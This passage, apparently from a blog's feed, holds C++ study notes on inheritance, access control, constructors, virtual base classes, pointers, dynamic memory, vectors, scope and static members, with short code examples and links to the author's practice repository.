        <content type="html"><![CDATA[<h1 id="Class-Inheritance-and-Derivation"><a href="#Class-Inheritance-and-Derivation" class="headerlink" title="Class Inheritance and Derivation"></a>Class Inheritance and Derivation</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Inheritance means obtaining <strong>attributes</strong> and <strong>behavioral characteristics</strong> from ancestors.</p><p>Class inheritance is when a new class obtains existing characteristics from an existing class. From another perspective, the process of creating a new class from an existing class is called class derivation.</p><div class="note info flat"><p>They are essentially the same, just the same process viewed from different angles.</p></div><h3 id="Purpose-of-Inheritance-and-Derivation"><a href="#Purpose-of-Inheritance-and-Derivation" class="headerlink" title="Purpose of Inheritance and Derivation"></a>Purpose of Inheritance and Derivation</h3><p>Purpose of inheritance: Achieve reuse of design and code.</p><p>Purpose of derivation: When new problems arise and the original program cannot solve them well, the original program needs to be modified.</p><hr><blockquote><p>Different classification standards</p><blockquote><p>Base classes that directly participate in deriving a class are called <strong>direct base classes</strong>, and base classes of base classes or even higher-level base classes are called <strong>indirect base classes</strong>.</p></blockquote><blockquote><p>A derived class can have multiple base classes at the same time, this situation is called <strong>multiple inheritance</strong>. Similarly, the case with only one base class is called <strong>single inheritance</strong>.</p></blockquote></blockquote><h2 id="Definition-of-Derived-Classes"><a href="#Definition-of-Derived-Classes" class="headerlink" title="Definition of Derived Classes"></a>Definition of Derived Classes</h2><p>Derived class definition syntax:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DerivedClassName</span>: inheritance_mode BaseClassName1,...,inheritance_mode BaseClassNamen</span><br><span class="line">&#123;</span><br><span class="line">  member declarations</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Process-of-Creating-Derived-Classes"><a href="#Process-of-Creating-Derived-Classes" class="headerlink" title="Process of Creating Derived Classes"></a>Process of Creating Derived Classes</h2><ol><li>Absorb base class members</li></ol><p>​After absorbing base class members, the derived class actually contains all members from its base classes <strong>except constructors and destructors</strong>.</p><ol start="2"><li>Modify base class members</li></ol><p>​If a derived class declares a new member with the same name as a base class member, the derived new member <strong>hides or overrides</strong> the outer member with the same name.</p><ol start="3"><li>Add new members</li></ol><p>​Derived classes add new members to develop functionality.</p><h1 id="Access-Control"><a href="#Access-Control" class="headerlink" title="Access Control"></a>Access Control</h1><p>Access mainly comes from two aspects: first, new members in derived classes accessing members inherited from base classes; second, outside the derived class, accessing members inherited from base classes through derived class objects.</p><p>Inheritance modes are mainly divided into <strong>three types</strong>, and their respective characteristics are listed below.</p><h2 id="Public-Inheritance-public"><a href="#Public-Inheritance-public" class="headerlink" title="Public Inheritance (public)"></a>Public Inheritance (public)</h2><ul><li><p>The access attributes of public and protected members of the base class <strong>remain unchanged</strong> in the derived class, but private members of the base class <strong>cannot be directly accessed</strong>.</p></li><li><p>Member functions in derived classes can directly access public and protected members of the base class, but <strong>cannot directly access</strong> private members of the base class.</p></li><li><p>When accessing members inherited from the base class through derived class objects, <strong>only public members can be accessed</strong>.</p></li></ul><h2 id="Protected-Inheritance-protected"><a href="#Protected-Inheritance-protected" class="headerlink" title="Protected Inheritance (protected)"></a>Protected Inheritance (protected)</h2><ul><li><p>Both public and protected members of the base class appear in the derived class <strong>as protected</strong>, but private members of the base class <strong>cannot be directly accessed</strong>.</p></li><li><p>Member functions in derived classes can directly access public and protected members of the base class, but cannot directly access private members of the base class.</p></li><li><p>Through derived class objects, <strong>no members inherited from the base class can be directly accessed</strong>.</p></li></ul><h2 id="Private-Inheritance-private"><a href="#Private-Inheritance-private" class="headerlink" title="Private Inheritance (private)"></a>Private Inheritance (private)</h2><ul><li><p>Both public and protected members of the base class appear in the derived class <strong>as private</strong>, but private members of the base class <strong>cannot be directly accessed</strong>.</p></li><li><p>Member functions in derived classes <strong>can directly access</strong> public and protected members of the base class, but <strong>cannot directly access</strong> private members of the base class.</p></li><li><p>Through derived class objects, <strong>no members inherited from the base class can be directly accessed</strong>.</p></li></ul><div class="note success flat"><p>It is not difficult to see that the second point of these three inheritance methods is exactly the same, which follows the principle of data sharing and protection. Derived class objects can access public members under public inheritance, but cannot access them in other cases for data protection.</p></div><p><a href="https://www.cnblogs.com/NueXini/p/16180257.html">Attached is a good detailed explanation</a></p><h1 id="Type-Compatibility-Rules"><a href="#Type-Compatibility-Rules" class="headerlink" title="Type Compatibility Rules"></a>Type Compatibility Rules</h1><p>Type compatibility rules mean that anywhere a base class object is needed, <strong>public derived class objects</strong> can be used as substitutes. Through public inheritance, derived classes get all members of the base class except constructors and destructors, possessing all functionality of the base class. (Protected and private inheritance don’t work because objects cannot access any members inherited from the base class)</p><p>Example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;...&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>: <span class="keyword">public</span> B &#123;...&#125;</span><br><span class="line"></span><br><span class="line">B b1, * pb1;</span><br><span class="line">D d1;</span><br></pre></td></tr></table></figure><p>Based on the above code, there are three substitution situations:</p><ul><li><p>Derived class objects can be implicitly converted to base class objects</p><p><code>b1=d1;</code></p></li><li><p>Derived class objects can initialize base class references</p><p><code>B &amp;rb=d1;</code></p></li><li><p>Derived class pointers can be implicitly converted to base class pointers</p><p><code>pb1=&amp;d1</code></p></li></ul><p>This compatibility rule allows us to use the same function to uniformly handle base class and public derived class objects. That is, when the formal parameter is a base class object (reference, pointer), the actual parameter can be a derived class object or pointer. This greatly improves program efficiency.</p><h1 id="Constructors-and-Destructors-of-Derived-Classes"><a href="#Constructors-and-Destructors-of-Derived-Classes" class="headerlink" title="Constructors and Destructors of Derived Classes"></a>Constructors and Destructors of Derived Classes</h1><p>Constructors of derived classes are only responsible for initializing newly added members of the derived class. For all members inherited from the base class, initialization is still done by the base class constructor. Finally, cleanup of derived objects also requires adding new destructors.</p><h2 id="Constructors"><a href="#Constructors" class="headerlink" title="Constructors"></a>Constructors</h2><p>Since derived classes cannot access many data members in the base class, they need to rely on the base class constructor. When constructing derived class objects, the base class constructor is called first, then the newly added member objects of the derived class are initialized.</p><p>General syntax form:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DerivedClassName::<span class="built_in">DerivedClassName</span>(parameter_list):<span class="built_in">BaseClassName1</span>(BaseClassName1_initialization_parameters),...,<span class="built_in">BaseClassNamen</span>(BaseClassNamen_initialization_parameters)</span><br><span class="line">,<span class="built_in">member_object_name1</span>(member_object1_initialization_parameters),...,<span class="built_in">member_object_namem</span>(member_objectm_initialization_parameters)</span><br><span class="line">&#123;</span><br><span class="line">  other initialization operations of derived <span class="keyword">class</span> <span class="title class_">constructor</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>General order of constructor execution:</p><ol><li>Call base class constructors in the order they were declared during inheritance (left to right).</li><li>Initialize newly added member objects of the derived class in the order they were declared in the class.</li><li>Execute the content in the derived class constructor body.</li></ol><h2 id="Copy-Constructor"><a href="#Copy-Constructor" class="headerlink" title="Copy Constructor"></a>Copy Constructor</h2><p>Derived classes also use the base class copy constructor when performing copy construction.</p><p>Example: If writing a copy constructor for the Derived class (with Base class as base class), the form is:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Derived::<span class="built_in">Derived</span>(<span class="type">const</span> Derived &amp;v): <span class="built_in">Base</span>(v)&#123;...&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>Here the base class uses a reference to the derived class, which fully complies with the type compatibility rules where derived class objects can be used to initialize the base class.</p></div><h2 id="Destructor"><a href="#Destructor" class="headerlink" title="Destructor"></a>Destructor</h2><p>Actually, it’s completely consistent with the idea of constructors, the biggest difference is that <strong>the order of destruction is completely opposite to the order of initialization.</strong></p><hr><h1 id="Identification-and-Access-of-Derived-Class-Members"><a href="#Identification-and-Access-of-Derived-Class-Members" class="headerlink" title="Identification and Access of Derived Class Members"></a>Identification and Access of Derived Class Members</h1><h2 id="Scope-Resolution-Operator"><a href="#Scope-Resolution-Operator" class="headerlink" title="Scope Resolution Operator"></a>Scope Resolution Operator</h2><p>“::” is the scope resolution operator, used to specify the name of the class where the member to be accessed is located.</p><p>If a derived class declares a new function with the same name as a base class member function, even if the function parameter lists are different, all overloaded forms of the inherited function with the same name from the base class will be hidden.</p><p>The same applies to data members. New members with the same name will override the base class; if multiple inheritance base classes are duplicated, ambiguity will arise and must be resolved by using class names and scope resolution operators to identify members.</p><div class="note danger flat"><p>Only functions defined in the same scope are called overloads.</p></div><hr><p>The using keyword can be used to use identifiers from other scopes.</p><h2 id="Virtual-Base-Classes"><a href="#Virtual-Base-Classes" class="headerlink" title="Virtual Base Classes"></a>Virtual Base Classes</h2><p>Suppose a derived class inherits from multiple base classes, and some or all of these base classes are derived from <strong>another common base class</strong>, then in this derived class, there will be the same names and <strong>multiple copies</strong> in memory, causing program overhead.</p><p>At this time, the common base class can be set as a virtual base class, so that data members with the same name inherited from different paths have only one copy in memory, and the same function name has only one mapping.</p><p>Syntax form:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DerivedClassName</span>:<span class="keyword">virtual</span> inheritance_mode BaseClassName</span><br></pre></td></tr></table></figure><h2 id="Constructors-of-Virtual-Base-Classes-and-Their-Derived-Classes"><a href="#Constructors-of-Virtual-Base-Classes-and-Their-Derived-Classes" class="headerlink" title="Constructors of Virtual Base Classes and Their Derived Classes"></a>Constructors of Virtual Base Classes and Their Derived Classes</h2><p>In the entire inheritance relationship, all derived classes that directly or indirectly inherit from virtual base classes must list initialization of virtual base classes in the member initialization list of constructors.</p><p>When calling the constructor of virtual classes, the C++ compiler will specify the constructor of the most derived class to call the constructor of the virtual base class, so there’s no need to worry about multiple repeated calls.</p><blockquote><p>The general order of constructing an object of a class is:</p><p>(1) If the class has direct or indirect virtual base classes, then the constructor of the virtual base class is executed first.</p><p>(2) If there are other base classes, initialize them in the order they appear in the inheritance declaration list, but during construction, their virtual base class constructors are no longer executed.</p><p>(3) Initialize newly added member objects in the order they appear in the definition. For class-type member objects, if they appear in the constructor initialization list, execute the constructor with the specified parameters; if not, execute the default constructor; for basic-type member objects, if they appear in the initialization list, use the specified value to assign initial value, otherwise do nothing.</p><p>(4) Execute the constructor function body.</p></blockquote><h1 id="Program-Example-Solving-Linear-Equations-Using-Gaussian-Elimination"><a href="#Program-Example-Solving-Linear-Equations-Using-Gaussian-Elimination" class="headerlink" title="Program Example - Solving Linear Equations Using Gaussian Elimination"></a>Program Example - Solving Linear Equations Using Gaussian Elimination</h1><p><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/Gauss%E6%B6%88%E5%8E%BB_CPP">Source code on github</a></p><h1 id="Comprehensive-Example-Personal-Bank-Account-Management-Program"><a href="#Comprehensive-Example-Personal-Bank-Account-Management-Program" class="headerlink" title="Comprehensive Example - Personal Bank Account Management Program"></a>Comprehensive Example - Personal Bank Account Management Program</h1><p><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update_1">Source code on github</a></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Arrays, Pointers and Strings</title>
      <link href="/2022/07/23/C++%20Arrays,%20Pointers%20and%20Strings/"/>
      <url>/2022/07/23/C++%20Arrays,%20Pointers%20and%20Strings/</url>
      
        <content type="html"><![CDATA[<h1 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h1><p>An array is a collection of objects with a certain sequential relationship, and the objects that make up the array become elements of that array. An array name is a pointer that cannot be assigned, called a pointer constant.</p><blockquote><p>Two-dimensional arrays in C++ are treated as <strong>arrays of one-dimensional arrays</strong>. Therefore, two-dimensional arrays are stored in <strong>row-major</strong> order.</p></blockquote><hr><blockquote><p>When passing arrays as parameters, the size of the first dimension is generally not specified, and even if specified, it will be ignored.</p></blockquote><h2 id="Program-Example—Linear-Fitting"><a href="#Program-Example—Linear-Fitting" class="headerlink" title="Program Example—Linear Fitting"></a>Program Example—Linear Fitting</h2><p><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/Linear%20fit">View source code</a></p><hr><h1 id="Pointers"><a href="#Pointers" class="headerlink" title="Pointers"></a>Pointers</h1><p>Basic definitions and usage are omitted.</p><h2 id="Use-of-void-Pointers"><a href="#Use-of-void-Pointers" class="headerlink" title="Use of void Pointers"></a>Use of void Pointers</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">void</span> voidObject;             <span class="comment">//Cannot declare variables of void type</span></span><br><span class="line">  <span class="type">void</span> *pv;                    <span class="comment">//Can declare pointers of void type</span></span><br><span class="line">  <span class="type">int</span> i = <span class="number">5</span>;</span><br><span class="line">  pv = &amp;i;</span><br><span class="line">  <span class="type">int</span> *pint = <span class="built_in">static_cast</span>&lt;<span class="type">int</span> *&gt;(pv);</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;* pint=&quot;</span> &lt;&lt; * pint &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Running result:</span><br><span class="line">  * pint = <span class="number">5</span></span><br></pre></td></tr></table></figure><div class="note info flat"><p>Void pointers are generally only used when the data type pointed to by the pointer is uncertain.</p></div><h2 id="Use-of-Null-Pointers"><a href="#Use-of-Null-Pointers" class="headerlink" title="Use of Null Pointers"></a>Use of Null Pointers</h2><p>Arithmetic operations between different types of pointers or between pointers and non-zero integers are <strong>meaningless</strong>, but pointer variables can be compared with integer 0. 0 is specifically used to represent a null pointer, which is a pointer that does not point to any valid address.</p><p>Null pointers can also be represented using NULL.</p><div class="note success flat"><p>NULL is a macro defined in many header files, defined as 0.</p></div><h2 id="Object-Pointers"><a href="#Object-Pointers" class="headerlink" title="Object Pointers"></a>Object Pointers</h2><p>As the name suggests, pointers that point to objects.</p><p>When using object pointers, object members can be represented very intuitively. The syntax form is <code>object_pointer_name-&gt;member_name</code>, which is equivalent to accessing <code>(*object_pointer_name).member_name</code>.</p><p>Earlier in class composition, there was a concept called forward reference declaration, where two classes referenced each other during definition. This problem can be solved using pointers.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>;         <span class="comment">//Forward reference declaration</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">  A *x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">  B *y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Declaring a pointer instead of an object is allowed. Once A is defined, A objects can be declared.</p><h3 id="this-Pointer"><a href="#this-Pointer" class="headerlink" title="this Pointer"></a>this Pointer</h3><p>The this pointer is a special pointer implicitly present in every non-static member function of a class (including constructors and destructors), used to point to the object being <strong>operated on by the member function</strong></p><div class="note info flat"><p>The this pointer is an implicit parameter of member functions, allowing the function to know which object it’s operating on, thus accessing its data members. For constant member functions, this implicit parameter is of constant pointer type.</p></div><h3 id="Pointers-to-Non-static-Members-of-Classes"><a href="#Pointers-to-Non-static-Members-of-Classes" class="headerlink" title="Pointers to Non-static Members of Classes"></a>Pointers to Non-static Members of Classes</h3><p>Declaration statements:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type_specifier class_name::* pointer_name                           <span class="comment">//Declare pointer to data member</span></span><br><span class="line"><span class="built_in">type_specifier</span> (class_name::* pointer_name)(parameter_list);        <span class="comment">//Declare pointer to function member</span></span><br></pre></td></tr></table></figure><p>The general syntax for assigning values to pointers to data members is:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pointer_name = &amp;class_name::data_member_name;</span><br></pre></td></tr></table></figure><p>When accessing data members, you can use:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">object_name.*class_member_pointer_name</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">object_pointer_name -&gt; *class_member_pointer_name</span><br></pre></td></tr></table></figure><p>The general syntax for assigning values to pointers to member functions is:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pointer_name = &amp;class_name::function_member_name;</span><br></pre></td></tr></table></figure><h3 id="Pointers-to-Static-Members-of-Classes"><a href="#Pointers-to-Static-Members-of-Classes" class="headerlink" title="Pointers to Static Members of Classes"></a>Pointers to Static Members of Classes</h3><p>Only ordinary pointers need to be used:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type_specifier  *pointer_name = &amp;class_name::static_data_member</span><br><span class="line"><span class="built_in">type_specifier</span> (*pointer_name)(formal_parameters) = &amp;class_name::static_member_function</span><br></pre></td></tr></table></figure><h1 id="Dynamic-Memory-Allocation"><a href="#Dynamic-Memory-Allocation" class="headerlink" title="Dynamic Memory Allocation"></a>Dynamic Memory Allocation</h1><p>In C++ programs, two operators are used to create and delete heap objects (storage units applied for and released during program execution): <code>new</code> and <code>delete</code>.</p><div class="note danger flat"><p>Where there’s new, there must be delete for release, otherwise it leads to inability to reclaim memory, causing the program to occupy increasingly more memory, called memory leakage.</p></div><h2 id="Creating-an-Object-of-a-Class"><a href="#Creating-an-Object-of-a-Class" class="headerlink" title="Creating an Object of a Class"></a>Creating an Object of a Class</h2><blockquote><p>Details to note when new creates an object of a class.</p><blockquote><p>If the class has a user-defined default constructor, then <code>new T</code> and <code>new T()</code> have no difference.</p></blockquote><blockquote><p>If the class does not define a default constructor, using <code>new T</code> will call the system-generated implicit default constructor; using <code>new T()</code> will, in addition to executing this implicit function, also initialize members of basic data types and pointer types with 0, and this process is <strong>recursive</strong>.</p></blockquote></blockquote><h2 id="Creating-Multi-dimensional-Arrays"><a href="#Creating-Multi-dimensional-Arrays" class="headerlink" title="Creating Multi-dimensional Arrays"></a>Creating Multi-dimensional Arrays</h2><p>The form is as follows:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> type_name T[array_first_dimension_length][array_second_dimension_length]...;</span><br></pre></td></tr></table></figure><p>Where the first dimension length of the array can be any <strong>expression</strong> that results in a positive integer, while the lengths of other array dimensions must be <strong>constant expressions</strong> that result in positive integers.</p><p>Incorrect example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> * fp;</span><br><span class="line">fp = <span class="keyword">new</span> <span class="type">float</span>[<span class="number">10</span>][<span class="number">25</span>][<span class="number">10</span>]</span><br></pre></td></tr></table></figure> <div class="note danger flat"><p>Here the new operation produces a pointer to a <code>$25 \times 10$</code> two-dimensional float type array, while fp is a pointer to float type data, creating a contradiction!</p></div><h1 id="Creating-Array-Objects-with-vector"><a href="#Creating-Array-Objects-with-vector" class="headerlink" title="Creating Array Objects with vector"></a>Creating Array Objects with vector</h1><p>C++ provides a packaged dynamic array—vector, with various types. vector is <strong>not a class</strong>, but <strong>a class template</strong>.</p><p>The form for defining dynamic arrays using vector is:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;element_type&gt; <span class="title">array_object_name</span><span class="params">(array_length)</span></span>;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>All elements of array objects defined by vector will be initialized. If they are basic data types, all elements will be initialized with 0; if they are class types, the class’s default constructor will be called for initialization. So it’s necessary to ensure that classes used as array elements <strong>need to have default constructors</strong>. Initial values can be specified, but <strong>all element initial values must be the same</strong>.</p></div><h1 id="Reference-Related-Supplements"><a href="#Reference-Related-Supplements" class="headerlink" title="Reference Related Supplements"></a>Reference Related Supplements</h1><p>References are commonly used for function parameter lists and function return values. Below are two important concepts related to C++ references that C++ programmers must understand:</p><p><a href="https://www.runoob.com/cplusplus/passing-parameters-by-references.html">Using References as Parameters</a></p><p><a href="https://www.runoob.com/cplusplus/returning-values-by-reference.html">Using References as Return Values</a></p><h1 id="Deep-Copy-vs-Shallow-Copy"><a href="#Deep-Copy-vs-Shallow-Copy" class="headerlink" title="Deep Copy vs Shallow Copy"></a>Deep Copy vs Shallow Copy</h1><p>The implicit copy constructor only implements shallow copy, but such copying is not suitable for all situations.</p><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%B5%85%E5%A4%8D%E5%88%B6/main.cpp">Shallow Copy Code Example</a></p><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%B7%B1%E5%A4%8D%E5%88%B6/main.cpp">Deep Copy Code Example</a></p><h1 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h1><p>C++ has encapsulated a series of complex string operations, forming the string class for more convenient string manipulation.</p><div class="note info flat"><p>Many string operations require the assistance of <strong>string processing functions</strong> in the <strong>cstring</strong> header file. Using the string class requires including the <strong>string</strong> header file.</p></div><p><a href="https://www.runoob.com/cplusplus/cpp-strings.html">String Related Explanation</a></p><h1 id="Personal-Bank-Account-Management-Program"><a href="#Personal-Bank-Account-Management-Program" class="headerlink" title="Personal Bank Account Management Program"></a>Personal Bank Account Management Program</h1><p>Functional supplement to the previous management program.</p><p><a href="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update">Source code on github</a></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Data Sharing and Protection</title>
      <link href="/2022/07/21/C++%20Data%20Sharing%20and%20Protection/"/>
      <url>/2022/07/21/C++%20Data%20Sharing%20and%20Protection/</url>
      
        <content type="html"><![CDATA[<h1 id="Identifier-Scope-and-Visibility"><a href="#Identifier-Scope-and-Visibility" class="headerlink" title="Identifier Scope and Visibility"></a>Identifier Scope and Visibility</h1><h2 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h2><p>Scope is the <strong>valid region</strong> where an identifier is effective in the program text.</p><h3 id="Function-Prototype-Scope"><a href="#Function-Prototype-Scope" class="headerlink" title="Function Prototype Scope"></a>Function Prototype Scope</h3><p>The scope of formal parameters during function prototype declaration is the function prototype scope.</p><div class="note info flat"><p>In function prototype parameter lists, only the type matters, not the identifier, which can be omitted. For readability, it’s better to include it.</p></div><h3 id="Local-Scope"><a href="#Local-Scope" class="headerlink" title="Local Scope"></a>Local Scope</h3><p>Simply understood as variables declared <strong>within function bodies</strong>, from the declaration point to the closing brace of the block where the declaration is located.</p><blockquote><p>Variables with local scope are also called local variables.</p></blockquote><h3 id="Class-Scope"><a href="#Class-Scope" class="headerlink" title="Class Scope"></a>Class Scope</h3><p>A class is a collection of named members, and its member m has class scope. There are three ways to access it:</p><ol><li>If member m is not defined in the member function and is not masked by the function body, the function can directly access m;</li><li>Through expressions <code>x.m</code> or <code>X::m</code>. <strong>This is the most basic method</strong>, with the latter mainly used to access static members of the class.</li><li>Through <code>ptr-&gt;m</code> access, where ptr is a <strong>pointer</strong> to an object of that class.</li></ol><h3 id="Namespace-Scope"><a href="#Namespace-Scope" class="headerlink" title="Namespace Scope"></a>Namespace Scope</h3><p>The purpose of namespaces is to eliminate ambiguity that may exist in different files in a project, for example: when variables in two different modules have the same name.</p><p>The syntax is as follows:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> namespace_name&#123;</span><br><span class="line">  <span class="function">Various declarations within the <span class="title">namespace</span> <span class="params">(function declarations, <span class="keyword">class</span> declarations, ...)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>Within the namespace, identifiers defined in the current space can be used directly. If you need to use identifiers defined in other namespaces, you need to use <code>namespace_name::identifier</code>. To avoid verbosity, using statements are provided.</p><p>There are two forms of using statements:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> namespace_name::identifier</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> namespace_name</span><br></pre></td></tr></table></figure><p>Two special types of namespaces—global namespace and anonymous namespace.</p><p>The global namespace is the default namespace, and identifiers declared outside explicitly declared namespaces are all in a global namespace.</p><p>Anonymous namespace only needs to omit the namespace name when defining, and its purpose is to prevent identifiers you define from being accessed by any other namespace.</p><blockquote><p>All identifiers in the C++ standard library are declared in the std namespace, cout, cin, endl are all like this, so every program uses <code>using namespace std</code>, otherwise you need to use <code>std::cin</code>…</p></blockquote><p>Additionally, namespaces <strong>allow nesting</strong>.</p><div class="note info flat"><p>Variables with namespace scope are also called global variables.</p></div><hr><h2 id="Visibility"><a href="#Visibility" class="headerlink" title="Visibility"></a>Visibility</h2><p>The content is relatively simple and straightforward, so it’s omitted.</p><hr><h1 id="Object-Lifetime"><a href="#Object-Lifetime" class="headerlink" title="Object Lifetime"></a>Object Lifetime</h1><h2 id="Static-Lifetime"><a href="#Static-Lifetime" class="headerlink" title="Static Lifetime"></a>Static Lifetime</h2><p>Objects whose lifetime is the same as the program’s runtime are said to have static lifetime, and the keyword <strong>static</strong> needs to be used when declaring.</p><p>Characteristics: A copy is not created with each function call, nor does it become invalid when the function returns. Variables are shared during each call period. Assignment is performed only once, and the assignment statement at declaration is not executed multiple times.</p><div class="note info flat"><p>If not initialized at declaration, it defaults to 0.</p></div><h2 id="Dynamic-Lifetime"><a href="#Dynamic-Lifetime" class="headerlink" title="Dynamic Lifetime"></a>Dynamic Lifetime</h2><p>Local lifetime objects are born at the declaration point and end when the block where the declaration is located finishes execution.</p><h1 id="Class-Static-Members"><a href="#Class-Static-Members" class="headerlink" title="Class Static Members"></a>Class Static Members</h1><p>Objects also need to share data with each other, and static members solve this problem.</p><p>For example, if there’s an Employee class, we have several Employee objects, but how do we count how many Employee objects there are? This is when static data members can be used, as this data member is shared by all objects.</p><h2 id="Static-Data-Members"><a href="#Static-Data-Members" class="headerlink" title="Static Data Members"></a>Static Data Members</h2><p>When a certain attribute is <strong>shared by the entire class</strong> and <strong>does not belong to any specific object</strong>, the <strong>static</strong> keyword is used to declare it as a static member. There is only one copy in the entire class, maintained and used by all objects.</p><p>Because it doesn’t belong to any object and has static lifetime, it is accessed through the class name. “<strong>class_name::identifier</strong>“.</p><div class="note warning flat"><p>In the class definition, only a reference declaration is made. A definition declaration must be made somewhere in the namespace scope using the class name qualifier, where initialization can also be performed.</p></div><p>Program example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;                                        <span class="comment">//Point class definition public: //external interface</span></span><br><span class="line"><span class="built_in">Point</span>(<span class="type">int</span> x = <span class="number">0</span>, <span class="type">int</span> y = <span class="number">0</span>) : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y)&#123;          <span class="comment">//constructor                                               